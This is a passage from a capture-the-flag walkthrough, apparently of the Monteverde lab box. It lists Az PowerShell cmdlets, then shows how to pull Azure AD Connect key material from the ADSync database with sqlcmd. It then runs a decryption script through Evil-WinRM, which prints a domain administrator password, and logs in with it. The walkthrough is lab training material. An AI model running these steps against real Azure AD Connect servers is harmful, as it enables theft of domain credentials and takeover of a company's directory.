Cmdlet          Get-AzRoleAssignment                               1.9.0      Az.Resources
Cmdlet          Get-AzRoleDefinition                               1.9.0      Az.Resources
Cmdlet          Get-AzSubscription                                 1.6.6      Az.Accounts
Cmdlet          Get-AzTag                                          1.9.0      Az.Resources
Cmdlet          Get-AzTenant                                       1.6.6      Az.Accounts
Cmdlet          Get-AzureADConnectHealthProxySettings              1.0        AzureADConnectHealthSync
Cmdlet          Import-AzContext                                   1.6.6      Az.Accounts
Cmdlet          Invoke-AzResourceAction                            1.9.0      Az.Resources
Cmdlet          Move-AzResource                                    1.9.0      Az.Resources
Cmdlet          New-AzADAppCredential                              1.9.0      Az.Resources
Cmdlet          New-AzADApplication                                1.9.0      Az.Resources
Cmdlet          New-AzADGroup                                      1.9.0      Az.Resources
Cmdlet          New-AzADServicePrincipal                           1.9.0      Az.Resources
Cmdlet          New-AzADSpCredential                               1.9.0      Az.Resources
Cmdlet          New-AzADUser                                       1.9.0      Az.Resources
Cmdlet          New-AzDeployment                                   1.9.0      Az.Resources
Cmdlet          New-AzManagedApplication                           1.9.0      Az.Resources
Cmdlet          New-AzManagedApplicationDefinition                 1.9.0      Az.Resources
Cmdlet          New-AzManagementGroup                              1.9.0      Az.Resources
Cmdlet          New-AzManagementGroupSubscription                  1.9.0      Az.Resources
Cmdlet          New-AzPolicyAssignment                             1.9.0      Az.Resources
Cmdlet          New-AzPolicyDefinition                             1.9.0      Az.Resources
Cmdlet          New-AzPolicySetDefinition                          1.9.0      Az.Resources
Cmdlet          New-AzResource                                     1.9.0      Az.Resources
Cmdlet          New-AzResourceGroup                                1.9.0      Az.Resources
Cmdlet          New-AzResourceGroupDeployment                      1.9.0      Az.Resources
Cmdlet          New-AzResourceLock                                 1.9.0      Az.Resources
Cmdlet          New-AzRoleAssignment                               1.9.0      Az.Resources
Cmdlet          New-AzRoleDefinition                               1.9.0      Az.Resources
Cmdlet          New-AzTag                                          1.9.0      Az.Resources
Cmdlet          Register-AzModule                                  1.6.6      Az.Accounts
Cmdlet          Register-AzProviderFeature                         1.9.0      Az.Resources
Cmdlet          Register-AzResourceProvider                        1.9.0      Az.Resources
Cmdlet          Register-AzureADConnectHealthSyncAgent             1.0        AzureADConnectHealthSync
Cmdlet          Remove-AzADAppCredential                           1.9.0      Az.Resources
Cmdlet          Remove-AzADApplication                             1.9.0      Az.Resources
Cmdlet          Remove-AzADGroup                                   1.9.0      Az.Resources
Cmdlet          Remove-AzADGroupMember                             1.9.0      Az.Resources
Cmdlet          Remove-AzADServicePrincipal                        1.9.0      Az.Resources
Cmdlet          Remove-AzADSpCredential                            1.9.0      Az.Resources
Cmdlet          Remove-AzADUser                                    1.9.0      Az.Resources
Cmdlet          Remove-AzContext                                   1.6.6      Az.Accounts
Cmdlet          Remove-AzDeployment                                1.9.0      Az.Resources
Cmdlet          Remove-AzEnvironment                               1.6.6      Az.Accounts
Cmdlet          Remove-AzManagedApplication                        1.9.0      Az.Resources
Cmdlet          Remove-AzManagedApplicationDefinition              1.9.0      Az.Resources
Cmdlet          Remove-AzManagementGroup                           1.9.0      Az.Resources
Cmdlet          Remove-AzManagementGroupSubscription               1.9.0      Az.Resources
Cmdlet          Remove-AzPolicyAssignment                          1.9.0      Az.Resources
Cmdlet          Remove-AzPolicyDefinition                          1.9.0      Az.Resources
Cmdlet          Remove-AzPolicySetDefinition                       1.9.0      Az.Resources
Cmdlet          Remove-AzResource                                  1.9.0      Az.Resources
Cmdlet          Remove-AzResourceGroup                             1.9.0      Az.Resources
Cmdlet          Remove-AzResourceGroupDeployment                   1.9.0      Az.Resources
Cmdlet          Remove-AzResourceLock                              1.9.0      Az.Resources
Cmdlet          Remove-AzRoleAssignment                            1.9.0      Az.Resources
Cmdlet          Remove-AzRoleDefinition                            1.9.0      Az.Resources
Cmdlet          Remove-AzTag                                       1.9.0      Az.Resources
Cmdlet          Rename-AzContext                                   1.6.6      Az.Accounts
Cmdlet          Resolve-AzError                                    1.6.6      Az.Accounts
Cmdlet          Save-AzContext                                     1.6.6      Az.Accounts
Cmdlet          Save-AzDeploymentTemplate                          1.9.0      Az.Resources
Cmdlet          Save-AzResourceGroupDeploymentTemplate             1.9.0      Az.Resources
Cmdlet          Select-AzContext                                   1.6.6      Az.Accounts
Cmdlet          Select-AzProfile                                   1.6.6      Az.Accounts
Cmdlet          Send-Feedback                                      1.6.6      Az.Accounts
Cmdlet          Set-AzContext                                      1.6.6      Az.Accounts
Cmdlet          Set-AzDefault                                      1.6.6      Az.Accounts
Cmdlet          Set-AzEnvironment                                  1.6.6      Az.Accounts
Cmdlet          Set-AzManagedApplication                           1.9.0      Az.Resources
Cmdlet          Set-AzManagedApplicationDefinition                 1.9.0      Az.Resources
Cmdlet          Set-AzPolicyAssignment                             1.9.0      Az.Resources
Cmdlet          Set-AzPolicyDefinition                             1.9.0      Az.Resources
Cmdlet          Set-AzPolicySetDefinition                          1.9.0      Az.Resources
Cmdlet          Set-AzResource                                     1.9.0      Az.Resources
Cmdlet          Set-AzResourceGroup                                1.9.0      Az.Resources
Cmdlet          Set-AzResourceLock                                 1.9.0      Az.Resources
Cmdlet          Set-AzRoleDefinition                               1.9.0      Az.Resources
Cmdlet          Set-AzureADConnectHealthProxySettings              1.0        AzureADConnectHealthSync
Cmdlet          Stop-AzDeployment                                  1.9.0      Az.Resources
Cmdlet          Stop-AzResourceGroupDeployment                     1.9.0      Az.Resources
Cmdlet          Test-AzDeployment                                  1.9.0      Az.Resources
Cmdlet          Test-AzResourceGroupDeployment                     1.9.0      Az.Resources
Cmdlet          Test-AzureADConnectHealthConnectivity              1.0        AzureADConnectHealthSync
Cmdlet          Uninstall-AzureRm                                  1.6.6      Az.Accounts
Cmdlet          Unregister-AzResourceProvider                      1.9.0      Az.Resources
Cmdlet          Update-AzADApplication                             1.9.0      Az.Resources
Cmdlet          Update-AzADServicePrincipal                        1.9.0      Az.Resources
Cmdlet          Update-AzADUser                                    1.9.0      Az.Resources
Cmdlet          Update-AzManagementGroup                           1.9.0      Az.Resources
```

I got stuck here, took a hint, and now knew that AAD Sync was the way forward.

```bash
Mode                LastWriteTime         Length Name
----                -------------         ------ ----
d-----         1/2/2020   9:36 PM                Common Files
d-----         1/2/2020   2:46 PM                internet explorer
d-----         1/2/2020   2:38 PM                Microsoft Analysis Services
d-----         1/2/2020   2:51 PM                Microsoft Azure Active Directory Connect
d-----         1/2/2020   3:37 PM                Microsoft Azure Active Directory Connect Upgrader
d-----         1/2/2020   3:02 PM                Microsoft Azure AD Connect Health Sync Agent
d-----         1/2/2020   2:53 PM                Microsoft Azure AD Sync
d-----         1/2/2020   2:38 PM                Microsoft SQL Server
d-----         1/2/2020   2:25 PM                Microsoft Visual Studio 10.0
d-----         1/2/2020   2:32 PM                Microsoft.NET
d-----         1/3/2020   5:28 AM                PackageManagement
d-----         1/2/2020   9:37 PM                VMware
d-r---         1/2/2020   2:46 PM                Windows Defender
d-----         1/2/2020   2:46 PM                Windows Defender Advanced Threat Protection
d-----        9/15/2018  12:19 AM                Windows Mail
d-----         1/2/2020   2:46 PM                Windows Media Player
d-----        9/15/2018  12:19 AM                Windows Multimedia Platform
d-----        9/15/2018  12:28 AM                windows nt
d-----         1/2/2020   2:46 PM                Windows Photo Viewer
d-----        9/15/2018  12:19 AM                Windows Portable Devices
d-----        9/15/2018  12:19 AM                Windows Security
d-----         1/3/2020   5:28 AM                WindowsPowerShell
```

We can see it in the program files.

And also that there is a service account

![](attachment/5ce09d0cc4370953321096fe40ba73ce.png)

There are some tools like [adconnectdump](https://github.com/fox-it/adconnectdump) but that didn't work.

We have to manually exploit with [this](https://blog.xpnsec.com/azuread-connect-for-redteam/), powershell script.

We need the instance_id, key_id, and entropy.

```bash
sqlcmd -S MONTEVERDE -Q "use ADsync; select instance_id,keyset_id,entropy from
mms_server_configuration"
```

We can put those in the script like so.

```powershell
$key_id = 1
$instance_id = [GUID]"1852B527-DD4F-4ECF-B541-EFCCBFF29E31"
$entropy = [GUID]"194EC2FC-F186-46CF-B44D-071EB61F49CD"
```

Update the `$Client` variable.

```powershell
$client = new-object System.Data.SqlClient.SqlConnection -ArgumentList
"Server=MONTEVERDE;Database=ADSync;Trusted_Connection=true"
```

Upload the script and run it.

```powershell
*Evil-WinRM* PS C:\Users\mhope\Documen.\azuread_decrypt_msol.ps1
AD Connect Sync Credential Extract POC (@_xpn_)

Domain: MEGABANK.LOCAL
Username: administrator
Password: d0m@in4dminyeah!
```


```bash
evil-winrm -i 10.10.10.172 -u administrator -p 'd0m@in4dminyeah!'
```

Anytime AAD Connect is in play DCSync is also in play because hashes are being replicated so those permissions have to exist.

- [ ] https://blog.xpnsec.com/azuread-connect-for-redteam/
- [ ] https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/dcsync
